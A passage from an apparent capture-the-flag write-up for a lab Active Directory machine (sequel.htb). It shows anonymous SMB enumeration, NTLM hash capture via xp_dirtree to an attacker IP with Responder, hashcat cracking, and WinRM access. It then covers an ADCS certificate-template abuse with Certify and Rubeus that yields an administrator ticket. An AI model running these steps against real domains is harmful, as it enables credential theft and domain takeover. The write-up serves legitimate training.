2y975KLuHAy+5Kt9sSzTZH3U9eDo3ouXJFkxxfTD8fI+E2QgR01DzNSLLxVTQJM4 | vVo4dAF5VkO4pX0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAnQo9FVql9vODv2iC | LXcbdSz6Bjpr7TL+1+DUF8rHuoUCpAlIH1qht1BknMTGDkSv++QO1ssXZl9SLySh | 1E+regE8nMnYqBvfKIzjjbj2KM+A0FXSiRYw+glAqnWJZxHZGK/5Q7og46DgekSK | 8/dt8KdjCEmdzsNK88EDaUr805ISWQgumAkH8KcSc7EovTTJPTAG07+AlS/fBrdx | 08MD1qz7smBmccpJgzSeAtcTYsv2QHILv7kxVOXYPhPh4zttq8eaidkXC0JGJrfe | 13QaC0/lVMkD3zuNfkr5sMuxVZZPrUsYIbXObwek2Vbkip/RvaMQz5BOHzl/SyNJ | VQR56g== |_-----END CERTIFICATE----- | ms-sql-ntlm-info: | Target_Name: sequel | NetBIOS_Domain_Name: sequel | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: dc.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 |_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time. 3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Issuer: commonName=sequel-DC-CA/domainComponent=sequel | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-11-18T21:20:35 | Not valid after: 2023-11-18T21:20:35 | MD5: 869f 7f54 b2ed ff74 708d 1a6d df34 b9bd | SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa | -----BEGIN CERTIFICATE----- | MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs | MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4 | MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv | mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0 | icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p | Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo | fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl | 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww | LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy | MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw | eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA | MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl | AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7 | lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud | HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj | LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD | Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv | Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50 | MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl | cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049 | U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy | dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5 | MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj | LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+ | /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed | RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC | frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r | nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb | Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ= |_-----END CERTIFICATE----- |_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time. 3269/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Issuer: commonName=sequel-DC-CA/domainComponent=sequel | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-11-18T21:20:35 | Not valid after: 2023-11-18T21:20:35 | MD5: 869f 7f54 b2ed ff74 708d 1a6d df34 b9bd | SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa | -----BEGIN CERTIFICATE----- | MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs | MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4 | MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv | mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0 | icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p | Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo | fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl | 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww | LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy | MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw | eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA | MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl | AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7 | lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud | HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj | LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD | Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv | Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50 | MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl | cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049 | U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy | dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5 | MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj | LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+ | /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed | RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC | frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r | nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb | Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ= |_-----END CERTIFICATE----- |_ssl-date: 2023-04-30T00:25:17+00:00; +8h00m02s from scanner time. 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack .NET Message Framing Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 63970/tcp): CLEAN (Timeout) | Check 2 (port 40602/tcp): CLEAN (Timeout) | Check 3 (port 50586/udp): CLEAN (Timeout) | Check 4 (port 40313/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | ms-sql-info: | 10.10.11.202:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | smb2-time: | date: 2023-04-30T00:24:38 |_ start_date: N/A |_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m00s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 29 16:25:17 2023 -- 1 IP address (1 host up) scanned in 88.77 seconds We don’t see any HTTP/HTTPS port open, classic AD machine. Starting with SMB port, we can connect to it as NULL user and list out the shares. It can be seen that there is a share named as Public , we can access the share and see that it contains one PDF file which we can download to our machine.\n❯ smbclient -L //10.10.11.202/ -U \u0026#34;\u0026#34; Enter WORKGROUP\\\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Public Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ❯ smbclient //10.10.11.202/Public -U \u0026#34;\u0026#34; Enter WORKGROUP\\\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Nov 19 11:51:25 2022 .. D 0 Sat Nov 19 11:51:25 2022 SQL Server Procedures.pdf A 49551 Fri Nov 18 13:39:43 2022 5184255 blocks of size 4096. 1463762 blocks available smb: \\\u0026gt; mget * Get file SQL Server Procedures.pdf? yes getting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (105.7 KiloBytes/sec) (average 105.7 KiloBytes/sec) Checking the PDF, we see that had information about the MSSQL Server\nFrom the PDF, there was an email mentioned for the user brandon.brown\nmailto:brandon.brown@sequel.htb At the end of the PDF document, we see that there is a Bonus section and it contained a credential for PublicUser which can connect to the MSSQL Server\nUpon connecting to the MSSQL server as PublicUser , we can execute some common queries such for retrieving version, databases and so on. Although, this user did not have any permissions to query any of the mentioned database. But there was a stored procedure called xp_dirtree which is used to retrieve a directory from the network or local path and show them as rows/columns.\n❯ mssqlclient.py PublicUser:\u0026#39;GuestUserCantWrite1\u0026#39;@sequel.htb Impacket v0.9.25.dev1+20220407.165653.68fd6b79 - Copyright 2021 SecureAuth Corporation [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC\\SQLMOCK): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL\u0026gt; SELECT * FROM fn_my_permissions(NULL, \u0026#39;SERVER\u0026#39;); entity_name subentity_name permission_name -------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------ server CONNECT SQL server VIEW ANY DATABASE SQL\u0026gt; SELECT name FROM master.sys.databases name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb SQL\u0026gt; xp_dirtree \u0026#39;\\\\10.10.14.36\\a\u0026#39;; subdirectory depth --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------- I started [Responder.py](http://Responder.py) on my system and tried to use xp_dirtree to list out the directory share for my IP, what will happen here is the user having the permissions to execute the xp_dirtree procedure on the system. Doing so resulted in the connection made over the Responder and had the Net-NTLMv2 has for sql_svc user. It\u0026rsquo;s possible that the SQL Server service account (sql_svc) is being used to execute the xp_dirtree stored procedure, even though the attacker has logged in as a guest user. In this case, when the victim machine attempts to access the UNC path specified in the xp_dirtree command, it will use the credentials of the SQL Server service account to authenticate to the attacker\u0026rsquo;s machine, instead of using the guest user\u0026rsquo;s credentials.\nCracking the captured hash via hashcat and using rockyou.txt was successful:\n❯ hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt -o sql-svc.netntlmv2.cracked --force hashcat (v6.1.1) starting... You have enabled --force to bypass dangerous warnings and errors! This can hide serious problems and should only be done when debugging. Do not report hashcat issues encountered when using --force. OpenCL API (OpenCL 2.0 pocl 1.8 Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ==================================================================================================================================== * Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 3767/3831 MB (1024 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 64 MB Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 2 * Bytes.....: 27 * Keyspace..: 2 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. Session..........: hashcat Status...........: Cracked Hash.Name........: NetNTLMv2 Hash.Target......: SQL_SVC::sequel:8537c9ab2d2f88f9:5422174e2c2dc68bd5...000000 Time.Started.....: Sat Apr 29 16:56:51 2023, (0 secs) Time.Estimated...: Sat Apr 29 16:56:51 2023, (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 4010 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 2/2 (100.00%) Rejected.........: 0/2 (0.00%) Restore.Point....: 0/2 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 147258369 -\u0026gt; REGGIE1234ronnie Started: Sat Apr 29 16:56:51 2023 Stopped: Sat Apr 29 16:56:53 2023 Once the hash was cracked, we can use it to connect to the machine via WINRM using evil-winrm\nApparently, we still did not get the user flag, as expected. Now, starting off with the local enumeration of the machine, I found that there was a directory named SQL Server , checking the directory I saw that there was a Logs folder, downloading the log file from it for further checking:\n*Evil-WinRM* PS C:\\SQLServer\u0026gt; ls Directory: C:\\SQLServer Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/7/2023 8:06 AM Logs d----- 11/18/2022 1:37 PM SQLEXPR_2019 -a---- 11/18/2022 1:35 PM 6379936 sqlexpress.exe -a---- 11/18/2022 1:36 PM 268090448 SQLEXPR_x64_ENU.exe *Evil-WinRM* PS C:\\SQLServer\u0026gt; cd Logs *Evil-WinRM* PS C:\\SQLServer\\Logs\u0026gt; ls Directory: C:\\SQLServer\\Logs Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/7/2023 8:06 AM 27608 ERRORLOG.BAK *Evil-WinRM* PS C:\\SQLServer\\Logs\u0026gt; download ERRORLOG.BAK Info: Downloading ERRORLOG.BAK to ./ERRORLOG.BAK Info: Download successful! Checking the log file for any interesting details, we can see that it contains password for Ryan.Cooper\n2022-11-18 13:43:07.44 Logon Logon failed for user \u0026#39;sequel.htb\\Ryan.Cooper\u0026#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1] 2022-11-18 13:43:07.48 Logon Error: 18456, Severity: 14, State: 8. 2022-11-18 13:43:07.48 Logon Logon failed for user \u0026#39;NuclearMosquito3\u0026#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1] 2022-11-18 13:43:07.72 spid51 Attempting to load library \u0026#39;xpstar.dll\u0026#39; into memory. This is an informational message only. No user action is required. Using the credentials, we can connect via evil-winrm\nNow, we can get the user flag:\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Desktop\u0026gt; dir Directory: C:\\Users\\Ryan.Cooper\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/29/2023 7:16 AM 34 user.txt *Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Desktop\u0026gt; type user.txt f682a2bd6615f9bf0a8500dfe5e45711 Now, since we know that this is more of an AD environment, best is to run adPEAS.exe to shorten down the manual enumeration. We see that it found that there is a ADCS service which is probably here indicating that this could be the “potential” way\n[?] +++++ Searching for Active Directory Certificate Services Information +++++ [+] Found at least one available Active Directory Certificate Service adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2 [+] Found Active Directory Certificate Services \u0026#39;sequel-DC-CA\u0026#39;: CA Name:\tsequel-DC-CA CA dnshostname:\tdc.sequel.htb CA IP Address:\t10.10.11.202 Date of Creation:\t11/18/2022 21:08:46 DistinguishedName:\tCN=sequel-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb NTAuthCertificates:\tTrue Available Templates:\tUserAuthentication DirectoryEmailReplication DomainControllerAuthentication KerberosAuthentication EFSRecovery EFS DomainController WebServer Machine User SubCA Administrator Furthermore, we see that there is a certificate template named UserAuthentication and we seem to have ENROLEE_SUPPLIES_SUBJECT and GenericAll permission for sql_svc user, it also have the same permission for Domain Users as well which includes Ryan.Cooper\n[?] +++++ Searching for Vulnerable Certificate Templates +++++ adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy [?] +++++ Checking Template \u0026#39;UserAuthentication\u0026#39; +++++ [!] Template \u0026#39;UserAuthentication\u0026#39; has Flag \u0026#39;ENROLLEE_SUPPLIES_SUBJECT\u0026#39; [!] Identity \u0026#39;sequel\\sql_svc\u0026#39; has \u0026#39;GenericAll\u0026#39; permissions on template \u0026#39;UserAuthentication\u0026#39; [+] Identity \u0026#39;sequel\\Domain Users\u0026#39; has enrollment rights for template \u0026#39;UserAuthentication\u0026#39; Template Name:\tUserAuthentication Template distinguishedname:\tCN=UserAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb Date of Creation:\t11/18/2022 21:10:22 [+] Extended Key Usage:\tClient Authentication, Secure E-mail, Encrypting File System EnrollmentFlag:\tINCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS [!] CertificateNameFlag:\tENROLLEE_SUPPLIES_SUBJECT [!] Template Permissions:\tsequel\\sql_svc : GenericAll [+] Enrollment allowed for:\tsequel\\Domain Users Now, since we know there is a vulnerable certificate template, we can use Certify to perform an attack, to confirm things once, we can try to get more information for the template.\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\u0026gt; .\\Certify.exe find /vulnerable _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ \u0026#39;__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.1.0 [*] Action: Find certificate templates [*] Using the search base \u0026#39;CN=Configuration,DC=sequel,DC=htb\u0026#39; [*] Listing info about the Enterprise CA \u0026#39;sequel-DC-CA\u0026#39; Enterprise CA Name : sequel-DC-CA DNS Hostname : dc.sequel.htb FullName : dc.sequel.htb\\sequel-DC-CA Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED Cert SubjectName : CN=sequel-DC-CA, DC=sequel, DC=htb Cert Thumbprint : A263EA89CAFE503BB33513E359747FD262F91A56 Cert Serial : 1EF2FA9A7E6EADAD4F5382F4CE283101 Cert Start Date : 11/18/2022 12:58:46 PM Cert End Date : 11/18/2121 1:08:46 PM Cert Chain : CN=sequel-DC-CA,DC=sequel,DC=htb UserSpecifiedSAN : Disabled CA Permissions : Owner: BUILTIN\\Administrators S-1-5-32-544 Access Rights Principal Allow Enroll NT AUTHORITY\\Authenticated UsersS-1-5-11 Allow ManageCA, ManageCertificates BUILTIN\\Administrators S-1-5-32-544 Allow ManageCA, ManageCertificates sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 Allow ManageCA, ManageCertificates sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 Enrollment Agent Restrictions : None [!] Vulnerable Certificates Templates : CA Name : dc.sequel.htb\\sequel-DC-CA Template Name : UserAuthentication Schema Version : 2 Validity Period : 10 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 pkiextendedkeyusage : Client Authentication, Encrypting File System, Secure Email mspki-certificate-application-policy : Client Authentication, Encrypting File System, Secure Email Permissions Enrollment Permissions Enrollment Rights : sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Domain Users S-1-5-21-4078382237-1492182817-2568127209-513 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 Object Control Permissions Owner : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 WriteOwner Principals : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 WriteDacl Principals : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 WriteProperty Principals : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 Now, what we can do here is first get the private key and then use openssl to convert it to the certificate file which will later be used to get the TGT for administrator\nCertify.exe request /ca:sequel-DC-CA /template:UserAuthentication /altname:administrator Now, once we get the private key, we can just use openssl to convert it to the certificate (.pfx) file:\nopenssl pkcs12 -in cert.pem -keyex -CSP \u0026#34;Microsoft Enhanced Cryptographic Provider v1.0\u0026#34; -export -out cert.pfx Next thing is to copy the pfx file back to the sequel machine and use Certify to request the TGT for the administrator from the forged certificate. Additionally, we can use /getcredentials flag for the Rubeus to get the NTLM hash of the administrator user:\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\u0026gt; .\\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt /nowrap /getcredentials ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: \u0026#39;sequel.htb\\administrator\u0026#39; [*] Using domain controller: fe80::98a6:96af:75db:57b%4:88 [+] TGT request successful! [*] base64(ticket.kirbi): doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBEZkm9q0cqugszTybuxTVxYGM4dU6hCie3RT15cKV4Hd6t6c4ZovtVklZMs3wNY2qE1CXz50p7sWrdfAFtKFBvikg2bw/AWA43aYDwlV/+gtY5BVxSASTyQ+wlGC2g8lz9IgAD/rUb57EBcW/EeSKsYWHnr3eoZ6XzYPVALg4KFH2HJtA/qXORG5E0/vyIBce/w29+PbZtNgdkKBWdqlqi1eSbYlrnDIy/QFtJRc+rFYYwMpzNJcvJc2Cf1m1nt1DeV5sZYmFvFAHBsDyw5sBZd2E6iCPAfm3Cz07PzfhDDhxMu906B6AjHpcDY1zWf1LJkCTK64o5GABFcaZkKh3ogF+OjE/rQLvxeQY/5yDyUrAMSXUKJtJsFi9guraX1jDp81+NBljvfwJk9HW+9N91mplRHZCKmGcBuccTr3Jud4AG26/8w1DiXpQR4Sbn4aYZutxWUodvIDPj0Aay1jOfDaMjFOiyK7NsfugYEOX9Fs7SlAHEgXh+fewVrjjshGuLeIOiatWO1cjQPvlHbS6W2fj55s/RrFqFgbw6nXbqDsBtmu+EsspCuDE1swdnfPJL18sk7lTfyzC/Q7/LEB+fuphYxrEZKauIZ1ng2b4gPfAwpO4heaueqAu1Lf3VKvqfuh7rn84xWSHmA0yLL3DIgeKSt7EgXWPe9BE3kt++///uUcw7+HUVzMDsZ8B1zAfouVDcVOYDZU3yfLoTBhCnC2WE/umQr4T5fs3MFZ4o62TMXN+Gh9FqjuD5FtCptkRN/oouxQEvS0+H26DlvOW1oyeE9welXOljH9ZNG5uFcMyKuwp/tkXDKU6kNPygfUKAyJl9uyS/G9YNC11CzujLwqtLLFD3cbpJllDsBhJ5gY+pkl9aX2wie1EDXlAAgxnBs25+j97VTkgKm5boY0ppcvzLAQNeZekdiz18Bvio05S1rXew0fx/SSDfduTny6h0qWxLJvVHgdZiajs02xv+g8r9BbN28nO9KBIsfS1UkZRURxiuzJoTTqbbc+NBoNNhpb2fx8uq9iHR3dlfFx1Fy16iCWWmBfkxnquPMy8AZ57Ozx8Cn2EzzMmDTqW8LdEuk2Spnp/RZswRSett1SD5UuMHQcd7IotVRQNQ5fhx7DlDa9r51uddyChVUlVM06mPnEZphiqhDbWTuSN/HaNEfDW2rWOX24qLsi5VfkSC66sHTyEpF3sSE+Goi1eTBwnOewj/twwPFOJ/56ChrxX+yvknzoJsOjTV4O/4uAnu9O8C11xi+hvGLF4HRUE2KMZbZEyTpO+ImQKl6aRtry01yflcrlw1L8xBNzpQHRDqhNCts5PBoltvrlxEeAZIod/uXKSa/ft3UouxVcmKJxjjE9MoYsCUxGnmTCdI/rGOAD3Ajd+fxtcMth/v9UIBuVfQORd5AFxKXpJsifzTTyGBtl9hrylGSupt